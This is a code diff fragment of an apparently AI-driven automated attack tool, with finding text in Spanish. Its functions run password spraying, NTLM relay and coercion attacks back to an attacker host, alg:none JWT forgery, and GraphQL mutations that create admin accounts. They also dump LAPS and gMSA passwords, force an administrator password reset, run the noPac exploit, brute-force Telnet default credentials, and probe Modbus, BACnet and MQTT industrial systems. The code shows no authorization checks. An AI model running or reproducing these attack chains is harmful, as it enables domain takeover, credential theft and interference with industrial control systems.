+                "Summer2024!", "Winter2024!", "Spring2024!", "Autumn2024!",
+                "Company1!", "Admin2024!", "P@ssw0rd!", "Passw0rd1",
+                "Monday1!", "January1!", "Q1_2024!", "January2024!",
+                "Letmein1!", "Changeme1!", "123456aA!", "Abc123456!",
+            ]
+            with open("/tmp/smart_users.txt", "w") as f:
+                f.write("\n".join(all_users))
+            with open("/tmp/smart_passwords.txt", "w") as f:
+                f.write("\n".join(smart_passwords))
+            spray_out, _ = self._run_cmd(
+                "smart-spray",
+                f"crackmapexec smb {target} -u /tmp/smart_users.txt -p /tmp/smart_passwords.txt "
+                f"--no-bruteforce 2>/dev/null | grep -iE 'Pwn3d|\\+.*success' | head -10; "
+                f"crackmapexec ldap {target} -u /tmp/smart_users.txt -p /tmp/smart_passwords.txt "
+                f"--no-bruteforce 2>/dev/null | grep -iE '\\+.*success' | head -10",
+                target, timeout=60,
+            )
+            if re.search(r'Pwn3d|\[\+\].*success', spray_out, re.IGNORECASE):
+                cred_matches = re.findall(r'(\w[\w\.]+)\s+.*?(\S+)\s+(?:Pwn3d|success)', spray_out, re.IGNORECASE)
+                self._save_findings([{
+                    "title": f"Smart Password Spray — Credenciales Válidas @ {target}",
+                    "severity": "critical",
+                    "description": f"Password spray exitoso:\n{spray_out[:400]}",
+                    "cve": "",
+                }], target)
+                accumulated_output.append(f"=== Smart Spray {target} ===\n{spray_out[:400]}")
+
+        # ── F4b: NTLM relay with --delegate-access (S4U2Self) ─────────────
+        if 445 in port_set:
+            self._log(f"[Claude] F4b: NTLM relay + delegate-access → {target}")
+            smb_sign_check, _ = self._run_cmd(
+                "smb-sign-check-adv",
+                f"crackmapexec smb {target} 2>/dev/null | grep -i 'signing'",
+                target, timeout=15,
+            )
+            if re.search(r'signing.*false|not required', smb_sign_check, re.IGNORECASE):
+                relay_out, _ = self._run_cmd(
+                    "ntlm-relay-delegate",
+                    # Setup ntlmrelayx with delegate-access to get TGT for any user
+                    f"timeout 30 ntlmrelayx.py -t ldap://{target} --delegate-access "
+                    f"--add-computer ATTACKER_PC$ -smb2support 2>/dev/null | head -20; "
+                    f"# Also try ACL-based delegation\n"
+                    f"timeout 20 ntlmrelayx.py -t ldaps://{target} "
+                    f"--add-computer PWNED2024 --escalate-user 2>/dev/null | head -10",
+                    target, timeout=60,
+                )
+                if re.search(r'added.*machine|delegat|ATTACKER_PC|Getting shadow', relay_out, re.IGNORECASE):
+                    self._save_findings([{
+                        "title": f"NTLM Relay + S4U2Self — Kerberos Delegation Abuse @ {target}",
+                        "severity": "critical",
+                        "description": f"NTLM relay con delegate-access → crear machine account → S4U2Self → impersonar DA.\n{relay_out[:300]}",
+                        "cve": "CVE-2019-1040",
+                    }], target)
+
+        # ── F4c: Coercion attacks — PetitPotam, PrinterBug, DFSCoerce ─────
+        if 445 in port_set or 88 in port_set:
+            self._log(f"[Claude] F4c: Coercion attacks (PetitPotam/PrinterBug/DFSCoerce) → {target}")
+            coerce_out, _ = self._run_cmd(
+                "coercion-attacks",
+                # PetitPotam (MS-EFSRPC) — coerce DC to auth to us
+                f"timeout 20 python3 /opt/PetitPotam/PetitPotam.py "
+                f"{self.lhost} {target} 2>/dev/null | head -15; "
+                # PrinterBug (MS-RPRN)
+                f"timeout 20 python3 /opt/SpoolSample/SpoolSample.py "
+                f"{target} {self.lhost} 2>/dev/null | head -10; "
+                # DFSCoerce (MS-DFSNM)
+                f"timeout 20 python3 /opt/DFSCoerce/dfscoerce.py "
+                f"-u '' -p '' {self.lhost} {target} 2>/dev/null | head -10; "
+                # Check if we got NTLM hashes (need responder running)
+                f"cat /tmp/Responder-Session.log 2>/dev/null | grep {target} | head -5",
+                target, timeout=80,
+            )
+            if re.search(r'coerce|authenticated|NTLMv2|Hash.*:.*::.*:', coerce_out, re.IGNORECASE):
+                self._save_findings([{
+                    "title": f"Coercion Attack (PetitPotam/PrinterBug) — NTLM Auth Forced @ {target}",
+                    "severity": "critical",
+                    "description": f"Servidor forzado a autenticarse hacia atacante via PetitPotam/PrinterBug.\n{coerce_out[:400]}",
+                    "cve": "CVE-2021-36942",
+                }], target)
+
+    # ── F5: API security testing (REST/GraphQL/JWT/JS secrets) ────────────
+    def _api_security_test(self, target, open_ports, accumulated_output):
+        """REST OpenAPI fuzzing, GraphQL mutations, JWT RS256→HS256, JS API key extraction."""
+        http_ports = [p for p in open_ports if "http" in p["service"].lower()
+                      or p["port"] in (80, 443, 8080, 8443, 3000, 4000, 5000, 8000, 9000)]
+        if not http_ports:
+            return
+        self._log(f"[Claude] F5-API: REST/GraphQL/JWT/JS secrets → {target}")
+
+        for p in http_ports[:2]:
+            proto = "https" if p["port"] in (443, 8443) else "http"
+            base_url = f"{proto}://{target}:{p['port']}"
+
+            # ── F5a: OpenAPI/Swagger discovery + endpoint fuzzing ─────────
+            api_spec_paths = [
+                "/swagger.json", "/swagger/v1/swagger.json", "/openapi.json",
+                "/api/swagger.json", "/api/v1/swagger.json", "/api/v2/swagger.json",
+                "/docs/swagger.json", "/api-docs", "/api-docs.json", "/swagger-ui.html",
+                "/redoc", "/api/schema", "/api/openapi.yaml", "/v1/api-docs",
+            ]
+            for spec_path in api_spec_paths:
+                spec_out, _ = self._run_cmd(
+                    f"openapi-{spec_path.replace('/','_')[:25]}",
+                    f"curl -sL --max-time 8 '{base_url}{spec_path}' 2>/dev/null | head -30",
+                    target, timeout=12,
+                )
+                if re.search(r'"openapi"|"swagger"|"info".*"title"|paths.*\{', spec_out, re.IGNORECASE):
+                    # Parse endpoints
+                    endpoints = re.findall(r'"(/[^"]+)":\s*\{', spec_out)
+                    # Try auth bypass on discovered endpoints
+                    auth_bypass_hits = []
+                    for ep in endpoints[:10]:
+                        for method in ["GET", "DELETE"]:
+                            bypass_out, _ = self._run_cmd(
+                                f"api-authbypass-{ep[:20].replace('/','_')}",
+                                f"curl -sL --max-time 6 -X {method} -o /dev/null "
+                                f"-w '%{{http_code}} %{{size_download}}' "
+                                f"'{base_url}{ep}' 2>/dev/null; "
+                                # Try with null/empty auth
+                                f"curl -sL --max-time 6 -X {method} -o /dev/null "
+                                f"-w '%{{http_code}} %{{size_download}}' "
+                                f"-H 'Authorization: null' "
+                                f"'{base_url}{ep}' 2>/dev/null",
+                                target, timeout=10,
+                            )
+                            codes = re.findall(r'(\d{3}) (\d+)', bypass_out)
+                            for code, size in codes:
+                                if code in ("200", "201") and int(size) > 20:
+                                    auth_bypass_hits.append(f"{method} {ep} → {code} ({size}b)")
+                    if auth_bypass_hits:
+                        self._save_findings([{
+                            "title": f"API Auth Bypass — Endpoints sin Autenticación @ {base_url}",
+                            "severity": "high",
+                            "description": f"Spec: {spec_path}\nEndpoints accesibles sin auth:\n" + "\n".join(auth_bypass_hits[:8]),
+                            "cve": "",
+                        }], target)
+                    else:
+                        self._save_findings([{
+                            "title": f"API Schema Expuesto @ {base_url}{spec_path}",
+                            "severity": "medium",
+                            "description": f"Documentación API pública ({len(endpoints)} endpoints): {spec_path}\nEndpoints: {', '.join(endpoints[:10])}",
+                            "cve": "",
+                        }], target)
+                    accumulated_output.append(f"=== API Spec {base_url}{spec_path} ===\n{spec_out[:400]}")
+                    break
+
+            # ── F5b: GraphQL introspection + mutation abuse ───────────────
+            gql_paths = ["/graphql", "/api/graphql", "/query", "/gql", "/v1/graphql"]
+            for gql_path in gql_paths:
+                gql_out, _ = self._run_cmd(
+                    f"graphql-{gql_path.replace('/','_')[:20]}",
+                    f"curl -sL --max-time 10 -X POST "
+                    f"-H 'Content-Type: application/json' "
+                    f"-d '{{\"query\":\"{{__schema{{types{{name queryType{{name}} mutationType{{name}}}}}}}}\"}}' "
+                    f"'{base_url}{gql_path}' 2>/dev/null | head -30",
+                    target, timeout=15,
+                )
+                if re.search(r'"__schema"|"types"|queryType|mutationType', gql_out, re.IGNORECASE):
+                    type_names = re.findall(r'"name":"([A-Z][a-zA-Z]+)"', gql_out)
+                    # Try sensitive mutations
+                    for mut_name in ["createUser", "deleteUser", "updatePassword", "resetPassword", "adminLogin"]:
+                        mut_out, _ = self._run_cmd(
+                            f"gql-mut-{mut_name}",
+                            f"curl -sL --max-time 8 -X POST "
+                            f"-H 'Content-Type: application/json' "
+                            f"-d '{{\"query\":\"mutation{{    {mut_name}(input:{{email:\\\"admin@test.com\\\",role:\\\"admin\\\",password:\\\"pwned123\\\"}}){{id email role}}}}\"}}' "
+                            f"'{base_url}{gql_path}' 2>/dev/null | head -10",
+                            target, timeout=10,
+                        )
+                        if re.search(r'"id"|"email"|"role"|"token"', mut_out) and "error" not in mut_out.lower():
+                            self._save_findings([{
+                                "title": f"GraphQL Mutation Abuse: {mut_name} @ {base_url}{gql_path}",
+                                "severity": "critical",
+                                "description": f"Mutation GraphQL {mut_name} ejecutable sin autorización.\nResponse:\n{mut_out[:300]}",
+                                "cve": "",
+                            }], target)
+                    self._save_findings([{
+                        "title": f"GraphQL Introspection Habilitada @ {base_url}{gql_path}",
+                        "severity": "medium",
+                        "description": f"Introspección GraphQL pública — schema completo expuesto.\nTipos: {', '.join(type_names[:15])}",
+                        "cve": "",
+                    }], target)
+                    break
+
+            # ── F5c: JWT RS256 → HS256 confusion attack ───────────────────
+            # Fetch a JWT from login/auth endpoint
+            jwt_fetch, _ = self._run_cmd(
+                f"jwt-fetch-{p['port']}",
+                f"curl -sL --max-time 8 -X POST "
+                f"-H 'Content-Type: application/json' "
+                f"-d '{{\"username\":\"admin\",\"password\":\"admin\"}}' "
+                f"'{base_url}/api/login' 2>/dev/null | head -5; "
+                f"curl -sL --max-time 8 -X POST "
+                f"-H 'Content-Type: application/json' "
+                f"-d '{{\"username\":\"admin\",\"password\":\"admin\"}}' "
+                f"'{base_url}/api/v1/auth' 2>/dev/null | head -5; "
+                f"curl -sLD - --max-time 8 '{base_url}/' 2>/dev/null | "
+                f"grep -iE 'set-cookie.*jwt|authorization.*Bearer|eyJ' | head -3",
+                target, timeout=20,
+            )
+            jwt_match = re.search(r'(eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+)', jwt_fetch)
+            if jwt_match:
+                jwt_token = jwt_match.group(1)
+                # Decode header to check algorithm
+                try:
+                    import base64 as _b64
+                    header_b64 = jwt_token.split(".")[0] + "=="
+                    header_json = _b64.b64decode(header_b64 + "==").decode("utf-8", "ignore")
+                    alg = re.search(r'"alg"\s*:\s*"([^"]+)"', header_json)
+                    if alg and alg.group(1) in ("RS256", "RS384", "RS512"):
+                        # Try alg:none bypass
+                        none_payload = jwt_token.split(".")[1]
+                        # Construct alg:none token
+                        none_header = _b64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
+                        # Modify payload to admin
+                        try:
+                            payload_json = _b64.b64decode(none_payload + "==").decode("utf-8", "ignore")
+                            import json as _json
+                            payload_dict = _json.loads(payload_json)
+                            payload_dict["role"] = "admin"
+                            payload_dict["admin"] = True
+                            payload_dict["sub"] = "1"
+                            new_payload = _b64.urlsafe_b64encode(_json.dumps(payload_dict).encode()).rstrip(b"=").decode()
+                        except Exception:
+                            new_payload = none_payload
+                        forged_jwt = f"{none_header}.{new_payload}."
+                        jwt_test, _ = self._run_cmd(
+                            "jwt-none-test",
+                            f"curl -sL --max-time 8 "
+                            f"-H 'Authorization: Bearer {forged_jwt}' "
+                            f"'{base_url}/api/admin' 2>/dev/null | head -10; "
+                            f"curl -sL --max-time 8 "
+                            f"-H 'Authorization: Bearer {forged_jwt}' "
+                            f"'{base_url}/api/v1/users' 2>/dev/null | head -10",
+                            target, timeout=15,
+                        )
+                        if re.search(r'"id"|"email"|"role".*admin|admin.*true', jwt_test, re.IGNORECASE):
+                            self._save_findings([{
+                                "title": f"JWT Algorithm Confusion (alg:none) — Auth Bypass @ {base_url}",
+                                "severity": "critical",
+                                "description": f"JWT acepta alg:none → token forjado como admin válido.\nToken original: {jwt_token[:60]}...\n{jwt_test[:200]}",
+                                "cve": "CVE-2015-9235",
+                            }], target)
+                except Exception:
+                    pass
+
+            # ── F5d: API keys / secrets in JS bundles ─────────────────────
+            self._log(f"[Claude] F5d: JS bundle secret scanning → {base_url}")
+            js_scan, _ = self._run_cmd(
+                f"js-secrets-{p['port']}",
+                # Get all JS file URLs from main page
+                f"JS_URLS=$(curl -sL --max-time 10 '{base_url}/' 2>/dev/null | "
+                f"grep -oP 'src=[\"\\x27][^\"\\x27]+\\.js[^\"\\x27]*' | "
+                f"sed 's/src=[\"\\x27]//;s/[\"\\x27]//' | head -8); "
+                f"for JS in $JS_URLS; do "
+                f"  [ \"${{JS:0:4}}\" != 'http' ] && JS='{base_url}'\"$JS\"; "
+                f"  curl -sL --max-time 10 \"$JS\" 2>/dev/null | "
+                f"  grep -oP '(?:api_key|apikey|api-key|secret|token|password|auth|bearer|aws_access)[\"\\s]*[=:][\"\\s]*[\"\\x27][A-Za-z0-9_\\-\\./+]{16,}[\"\\x27]' | "
+                f"  head -5; "
+                f"done",
+                target, timeout=60,
+            )
+            secret_matches = re.findall(
+                r'(?:api.?key|secret|token|password|auth|bearer|aws)[^\n]{0,20}([A-Za-z0-9_\-\.\/+]{20,})',
+                js_scan, re.IGNORECASE
+            )
+            if secret_matches:
+                self._save_findings([{
+                    "title": f"API Keys / Secrets en JS Bundles @ {base_url}",
+                    "severity": "high",
+                    "description": f"Secrets hardcodeados encontrados en archivos JavaScript:\n" +
+                                   "\n".join(f"• {s[:60]}" for s in secret_matches[:8]),
+                    "cve": "",
+                }], target)
+                accumulated_output.append(f"=== JS Secrets {base_url} ===\n{js_scan[:400]}")
+
+    # ═════════════════════════════════════════════════════════════════════════
+    # TIER 2 — Full attack surface coverage
+    # ═════════════════════════════════════════════════════════════════════════
+
+    # ── G1: BloodHound full AD chain (LAPS, gMSA, ACL abuse, noPac) ───────
+    def _bloodhound_ad_chain(self, target, user, pwd, accumulated_output):
+        """BloodHound ingest, LAPS dump, gMSA recovery, ACL abuse, noPac CVE-2021-42278."""
+        self._log(f"[Claude] G1-BLOODHOUND: Full AD chain → {target}")
+        auth = f"-u '{user}' -p '{pwd}'" if user and pwd else ""
+        t_safe = target.replace(".", "_")
+
+        # ── G1a: BloodHound / SharpHound ingest ───────────────────────────
+        bh_out, _ = self._run_cmd(
+            "bloodhound-ingest",
+            f"bloodhound-python -u '{user}' -p '{pwd}' -d '' -ns {target} "
+            f"--collectionmethod All -o /tmp/bh_{t_safe}/ 2>/dev/null | head -20; "
+            f"# Parse shortest path to DA from JSON\n"
+            f"ls /tmp/bh_{t_safe}/*.json 2>/dev/null | head -5; "
+            f"cat /tmp/bh_{t_safe}/*users*.json 2>/dev/null | "
+            f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
+            f"admins=[u[\"Properties\"][\"name\"] for u in d.get(\"data\",[]) "
+            f"if u.get(\"Properties\",{{}}).get(\"admincount\")]; print(f\"DA candidates: {{admins[:5]}}\")' 2>/dev/null",
+            target, timeout=120,
+        )
+        if bh_out.strip():
+            accumulated_output.append(f"=== BloodHound {target} ===\n{bh_out[:600]}")
+            da_candidates = re.findall(r'DA candidates: \[([^\]]+)\]', bh_out)
+            if da_candidates:
+                self._save_findings([{
+                    "title": f"BloodHound: Domain Admin candidates → {target}",
+                    "severity": "high",
+                    "description": f"BloodHound identificó cuentas con admincount=1:\n{da_candidates[0]}",
+                    "cve": "",
+                }], target)
+
+        # ── G1b: LAPS password dump ───────────────────────────────────────
+        if auth:
+            laps_out, _ = self._run_cmd(
+                "laps-dump",
+                f"crackmapexec ldap {target} {auth} -M laps 2>/dev/null | head -20; "
+                f"# Direct LDAP query for ms-Mcs-AdmPwd\n"
+                f"ldapsearch -x -H ldap://{target} -b '' {auth.replace('-u ','').replace('-p ','')} "
+                f"'(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime 2>/dev/null | head -20; "
+                f"python3 -c \"import ldap3; "
+                f"s=ldap3.Server('{target}',get_info=ldap3.ALL); "
+                f"c=ldap3.Connection(s,'{user}','{pwd}',auto_bind=True); "
+                f"c.search('','(ms-Mcs-AdmPwd=*)',attributes=['ms-Mcs-AdmPwd','distinguishedName']); "
+                f"[print(e.entry_to_json()) for e in c.entries[:5]]\" 2>/dev/null",
+                target, timeout=30,
+            )
+            if re.search(r'ms-Mcs-AdmPwd|LAPS.*password|admin.*pwd', laps_out, re.IGNORECASE):
+                self._save_findings([{
+                    "title": f"LAPS Password Dumped — Local Admin Exposed @ {target}",
+                    "severity": "critical",
+                    "description": f"LAPS passwords accesibles con credenciales actuales:\n{laps_out[:400]}",
+                    "cve": "",
+                }], target)
+                accumulated_output.append(f"=== LAPS Dump ===\n{laps_out[:400]}")
+
+        # ── G1c: gMSA password recovery ───────────────────────────────────
+        if auth:
+            gmsa_out, _ = self._run_cmd(
+                "gmsa-recover",
+                f"python3 -c \"import ldap3,binascii; "
+                f"s=ldap3.Server('{target}',get_info=ldap3.ALL); "
+                f"c=ldap3.Connection(s,'{user}','{pwd}',auto_bind=True); "
+                f"c.search('','(objectClass=msDS-GroupManagedServiceAccount)',"
+                f"attributes=['sAMAccountName','msDS-ManagedPassword']); "
+                f"[print(f\\\"gMSA: {{e.sAMAccountName}} hash={{binascii.hexlify(bytes(e['msDS-ManagedPassword'].value)).decode()[:32] if e['msDS-ManagedPassword'] else 'no perms'}}\\\") "
+                f"for e in c.entries[:5]]\" 2>/dev/null; "
+                f"crackmapexec ldap {target} {auth} -M gmsa 2>/dev/null | head -15",
+                target, timeout=30,
+            )
+            if re.search(r'gMSA:|GMSA.*hash|msDS-ManagedPassword', gmsa_out, re.IGNORECASE):
+                self._save_findings([{
+                    "title": f"gMSA Password Recovered — Service Account Compromise @ {target}",
+                    "severity": "critical",
+                    "description": f"Group Managed Service Account password recuperado:\n{gmsa_out[:400]}",
+                    "cve": "",
+                }], target)
+
+        # ── G1d: ACL abuse — WriteDACL/GenericAll/GenericWrite ────────────
+        if auth:
+            acl_out, _ = self._run_cmd(
+                "acl-abuse-check",
+                f"crackmapexec ldap {target} {auth} -M daclread 2>/dev/null | "
+                f"grep -iE 'GenericAll|WriteDACL|GenericWrite|WriteOwner|ForceChangePassword' | head -20; "
+                f"python3 /opt/bloodyAD/bloodyAD.py --host {target} {auth} "
+                f"getObjectAttributes / nTSecurityDescriptor 2>/dev/null | head -20; "
+                # Try to force password change if GenericAll
+                f"net rpc password administrator 'Pwned2024!' -U '{user}%{pwd}' "
+                f"-S {target} 2>/dev/null | head -5",
+                target, timeout=40,
+            )
+            if re.search(r'GenericAll|WriteDACL|GenericWrite|WriteOwner|ForceChangePassword', acl_out, re.IGNORECASE):
+                self._save_findings([{
+                    "title": f"AD ACL Abuse — Privileged Rights Over AD Objects @ {target}",
+                    "severity": "critical",
+                    "description": f"Usuario {user} tiene derechos sobre objetos AD:\n{acl_out[:400]}",
+                    "cve": "",
+                }], target)
+
+        # ── G1e: noPac — CVE-2021-42278 + CVE-2021-42287 ─────────────────
+        nopac_out, _ = self._run_cmd(
+            "nopac-check",
+            f"python3 /opt/noPac/noPac.py {target}/'{user}':'{pwd}' -use-ldap 2>/dev/null | head -20; "
+            f"# Alternative: sAMAccountName spoofing\n"
+            f"python3 -c \""
+            f"from impacket.examples.secretsdump import RemoteOperations,SAMHashes; "
+            f"print('noPac check requires interactive session')\" 2>/dev/null; "
+            f"nmap --script smb-vuln-ms17-010 -p 445 {target} 2>/dev/null | grep VULNERABLE | head -3",
+            target, timeout=30,
+        )
+        if re.search(r'Got TGT|Administrator|noPac.*success|CVE-2021-4228', nopac_out, re.IGNORECASE):
+            self._save_findings([{
+                "title": f"noPac (CVE-2021-42278/42287) — sAMAccountName Spoofing DA Compromise",
+                "severity": "critical",
+                "description": f"noPac exploit exitoso → Domain Admin via sAMAccountName spoofing.\n{nopac_out[:300]}",
+                "cve": "CVE-2021-42278",
+            }], target)
+
+    # ── G2: ICS/SCADA/IoT scanning ────────────────────────────────────────
+    def _ics_scada_scan(self, target, open_ports, accumulated_output):
+        """Modbus, BACnet, MQTT, Telnet default creds, OT/SCADA Shodan dorks."""
+        self._log(f"[Claude] G2-ICS/SCADA: Operational Technology scanning → {target}")
+        port_set = {p["port"] for p in open_ports}
+
+        # ── G2a: Modbus (port 502) ────────────────────────────────────────
+        if 502 in port_set:
+            self._log(f"[Claude] G2a: Modbus → {target}:502")
+            modbus_out, _ = self._run_cmd(
+                "modbus-scan",
+                f"nmap -p 502 --script modbus-discover {target} 2>/dev/null | head -20; "
+                f"python3 -c \"\ntry:\n"
+                f"    from pymodbus.client import ModbusTcpClient\n"
+                f"    c=ModbusTcpClient('{target}',port=502,timeout=5)\n"
+                f"    c.connect()\n"
+                f"    r=c.read_holding_registers(0,10,unit=1)\n"
+                f"    if not r.isError(): print(f'MODBUS_OPEN: registers={{r.registers}}')\n"
+                f"    r2=c.read_coils(0,10,unit=1)\n"
+                f"    if not r2.isError(): print(f'MODBUS_COILS={{r2.bits}}')\n"
+                f"    c.close()\n"
+                f"except Exception as e: print(f'ERR:{{e}}')\n\" 2>/dev/null",
+                target, timeout=30,
+            )
+            if re.search(r'MODBUS_OPEN|Unit ID|Slave ID|Device Info', modbus_out, re.IGNORECASE):
+                self._save_findings([{
+                    "title": f"Modbus/TCP Sin Autenticación — PLC Accesible @ {target}:502",
+                    "severity": "critical",
+                    "description": f"Modbus TCP accesible sin autenticación → leer/escribir registros PLC.\n{modbus_out[:300]}",
+                    "cve": "",
+                }], target)
+                accumulated_output.append(f"=== Modbus {target} ===\n{modbus_out[:300]}")
+
+        # ── G2b: BACnet (port 47808 UDP) ──────────────────────────────────
+        bacnet_out, _ = self._run_cmd(
+            "bacnet-scan",
+            f"nmap -sU -p 47808 --script bacnet-info {target} 2>/dev/null | head -15; "
+            f"python3 -c \"\nimport socket\n"
+            f"s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n"
+            f"s.settimeout(5)\n"
+            f"# BACnet Who-Is broadcast\n"
+            f"whois=b'\\x81\\x0b\\x00\\x11\\x01\\x20\\xff\\xff\\x00\\xff\\x10\\x08'\n"
+            f"s.sendto(whois,('{target}',47808))\n"
+            f"try: d,a=s.recvfrom(1024); print(f'BACNET_RESPONSE: {{d.hex()}}')\n"
+            f"except: print('no response')\n\" 2>/dev/null",
+            target, timeout=20,
+        )
+        if re.search(r'BACNET_RESPONSE|BACnet|bacnet|vendor|object', bacnet_out, re.IGNORECASE):
+            self._save_findings([{
+                "title": f"BACnet Building Automation System Expuesto @ {target}:47808",
+                "severity": "high",
+                "description": f"Sistema BACnet (building automation/HVAC/lighting) accesible.\n{bacnet_out[:300]}",
+                "cve": "",
+            }], target)
+
+        # ── G2c: MQTT (port 1883/8883) ────────────────────────────────────
+        mqtt_ports = [p for p in [1883, 8883] if p in port_set]
+        for mp in mqtt_ports:
+            mqtt_out, _ = self._run_cmd(
+                f"mqtt-{mp}",
+                f"mosquitto_sub -h {target} -p {mp} -t '#' -C 20 --quiet 2>/dev/null | head -20; "
+                f"python3 -c \"\nimport socket,time\ns=socket.socket()\ns.settimeout(8)\n"
+                f"s.connect(('{target}',{mp}))\n"
+                f"# MQTT CONNECT packet\n"
+                f"connect=b'\\x10\\x13\\x00\\x04MQTT\\x04\\x00\\x00\\x3c\\x00\\x07pentscan'\n"
+                f"s.send(connect)\ntime.sleep(1)\nr=s.recv(4).hex()\n"
+                f"print(f'MQTT_CONNACK={{r}}')\n"
+                f"# Subscribe to all topics\n"
+                f"sub=b'\\x82\\x05\\x00\\x01\\x00\\x01#\\x00'\n"
+                f"s.send(sub)\ntime.sleep(2)\ndata=s.recv(1024)\n"
+                f"print(f'MQTT_DATA={{data[:200]}}')\n"
+                f"s.close()\" 2>/dev/null",
+                target, timeout=20,
+            )
+            if re.search(r'MQTT_CONNACK=20|MQTT_DATA|sensor|device|iot|telemetry', mqtt_out, re.IGNORECASE):
+                self._save_findings([{
+                    "title": f"MQTT Broker Sin Auth — IoT/Sensor Data Expuesto @ {target}:{mp}",
+                    "severity": "high",
+                    "description": f"MQTT broker accesible sin autenticación → suscripción a todos los topics.\n{mqtt_out[:400]}",
+                    "cve": "",
+                }], target)
+                accumulated_output.append(f"=== MQTT {target}:{mp} ===\n{mqtt_out[:300]}")
+
+        # ── G2d: Telnet default credentials (500+ devices) ────────────────
+        if 23 in port_set:
+            self._log(f"[Claude] G2d: Telnet default creds → {target}:23")
+            iot_creds = [
+                "admin:admin", "admin:password", "admin:", "admin:1234", "admin:12345",
+                "root:root", "root:", "root:admin", "root:password", "root:toor",
+                "user:user", "guest:guest", "operator:operator",
+                "admin:admin123", "admin:Admin1234", "ubnt:ubnt", "pi:raspberry",
+                "cisco:cisco", "enable:enable", "admin:cisco", "manager:manager",
+                "support:support", "service:service", "tech:tech",
+                # Router defaults
+                "admin:motorola", "admin:password1", "admin:0000", "admin:1111",
+                "admin:pass", "admin:access", "admin:Admin",
+            ]
+            with open("/tmp/telnet_creds.txt", "w") as f:
+                f.write("\n".join(iot_creds))
+            telnet_out, _ = self._run_cmd(
+                "telnet-defaultcreds",
+                f"hydra -C /tmp/telnet_creds.txt -t 4 -T 8 "
+                f"telnet://{target} 2>/dev/null | grep 'login:' | head -5; "
+                f"medusa -h {target} -C /tmp/telnet_creds.txt -M telnet -t 4 2>/dev/null | "
+                f"grep SUCCESS | head -5",
+                target, timeout=60,
+            )
+            if re.search(r'login:.*password:|SUCCESS|valid password', telnet_out, re.IGNORECASE):
+                self._save_findings([{
+                    "title": f"Telnet Default Credentials — IoT/Device Compromise @ {target}:23",
+                    "severity": "critical",
+                    "description": f"Credenciales por defecto válidas en Telnet.\n{telnet_out[:300]}",
+                    "cve": "",
+                }], target)
+
+        # ── G2e: Shodan OT/SCADA dork for target IP ───────────────────────
+        ot_shodan, _ = self._run_cmd(
+            "shodan-ot-check",
+            f"curl -sL --max-time 10 'https://internetdb.shodan.io/{target}' 2>/dev/null | "
+            f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
+            f"tags=d.get(\"tags\",[]);ports=d.get(\"ports\",[]);vulns=d.get(\"vulns\",[]); "
+            f"ot_tags=[t for t in tags if any(k in t.lower() for k in [\"ics\",\"scada\",\"modbus\",\"dnp3\",\"bacnet\",\"iec\",\"codesys\",\"plc\"])]; "
+            f"print(f\"OT tags: {{ot_tags}}, Ports: {{ports}}, Vulns: {{vulns}}\")' 2>/dev/null",
+            target, timeout=15,
+        )
+        if re.search(r'OT tags: \[|ics|scada|modbus|bacnet|plc', ot_shodan, re.IGNORECASE):
+            self._save_findings([{
+                "title": f"ICS/SCADA System Identificado en Shodan @ {target}",
+                "severity": "critical",
+                "description": f"Shodan identifica sistema OT/ICS/SCADA en {target}.\n{ot_shodan[:300]}",
+                "cve": "",
+            }], target)
+
+    # ── G3: Mobile API backend analysis ───────────────────────────────────
+    def _mobile_api_backend(self, target, open_ports, accumulated_output):
+        """APK analysis for hardcoded secrets, mobile API endpoint discovery."""
+        self._log(f"[Claude] G3-MOBILE: Mobile API backend analysis → {target}")
+        http_ports = [p for p in open_ports if p["port"] in (80, 443, 8080, 8443, 3000, 5000, 4000)]
+        if not http_ports:
+            return
+
+        for p in http_ports[:1]:
+            proto = "https" if p["port"] in (443, 8443) else "http"
+            base_url = f"{proto}://{target}:{p['port']}"
+
+            # ── G3a: Mobile-specific endpoint discovery ───────────────────
+            mobile_paths = [
+                "/api/mobile/v1/", "/api/app/", "/mobile/api/",
+                "/v1/mobile/", "/app/api/", "/api/ios/", "/api/android/",
+                "/api/v1/device/", "/api/auth/mobile", "/push/register",
+                "/api/v1/push", "/notification/register", "/fcm/register",
+            ]
+            for mp in mobile_paths:
+                mob_out, _ = self._run_cmd(
+                    f"mobile-api-{mp.replace('/','_')[:20]}",
+                    f"curl -sL --max-time 6 -o /dev/null -w '%{{http_code}}' "
+                    f"-H 'User-Agent: okhttp/4.9.0' "
+                    f"'{base_url}{mp}' 2>/dev/null",
+                    target, timeout=10,
+                )
+                if mob_out.strip() in ("200", "201", "403"):
+                    full_out, _ = self._run_cmd(
+                        f"mobile-api-full-{mp.replace('/','_')[:15]}",
+                        f"curl -sL --max-time 8 "
+                        f"-H 'User-Agent: okhttp/4.9.0' "
+                        f"-H 'X-Mobile-Token: null' "
+                        f"'{base_url}{mp}' 2>/dev/null | head -20",
+                        target, timeout=10,
+                    )
+                    if re.search(r'"id"|"token"|"user"|"device"', full_out):
+                        self._save_findings([{
+                            "title": f"Mobile API Endpoint Expuesto @ {base_url}{mp}",
+                            "severity": "medium",
+                            "description": f"Endpoint de API móvil accesible: {mp}\n{full_out[:300]}",
+                            "cve": "",
+                        }], target)
+
+            # ── G3b: APK analysis (if downloadable or available) ──────────
+            # Try to find APK download link
+            apk_find, _ = self._run_cmd(
+                "apk-find",
+                f"curl -sL --max-time 10 '{base_url}/' 2>/dev/null | "
+                f"grep -oP '[\"\\x27][^\"\\x27]+\\.apk[^\"\\x27]*' | tr -d '\"\\x27' | head -3; "
+                f"curl -sL --max-time 8 '{base_url}/download' 2>/dev/null | "
+                f"grep -oP 'https?://[^\"\\x27\\s]+\\.apk' | head -3",
+                target, timeout=15,
+            )
+            apk_url_match = re.search(r'(https?://[^\s]+\.apk|/[^\s\"\']+\.apk)', apk_find)
+            if apk_url_match:
+                apk_url = apk_url_match.group(1)
+                if not apk_url.startswith("http"):
+                    apk_url = f"{base_url}{apk_url}"
+                apk_analyze, _ = self._run_cmd(
+                    "apk-analyze",
+                    f"wget -q --timeout=30 '{apk_url}' -O /tmp/app_target.apk 2>/dev/null; "
+                    f"apktool d /tmp/app_target.apk -o /tmp/app_decompile -f 2>/dev/null | tail -3; "
+                    # Find hardcoded secrets
